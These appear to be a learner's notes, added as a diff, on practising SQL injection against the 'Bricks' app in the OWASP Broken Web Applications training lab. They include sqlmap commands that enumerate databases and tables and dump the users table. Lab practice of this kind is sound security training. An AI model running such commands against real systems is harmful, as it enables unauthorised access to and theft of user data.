@@ -1,0 +1,13 @@
+OWASPBWA
+    Testing some vulnerable Applications
+        Bricks
+            we have different login pages with different problems to test and learn SQL injection!
+            here we can intercept a request to this login page by BurpSuite and save it to a file to give it to the SQLMap.
+                instead of this, we should enter all parameters to the SQLMap by manually/hand!
+                    command:
+                        like sqlmap -r /tmp/file.txt --dbs
+                            it will find and list all Databases if it can and any other functionalities ;)
+                        like sqlmap -r /tmp/file.txt -D bricks
+                            it will get all Database Tables
+                        like sqlmap -r /tmp/file.txt -D bricks -T users --dump
+                            it will get all records of the users Table
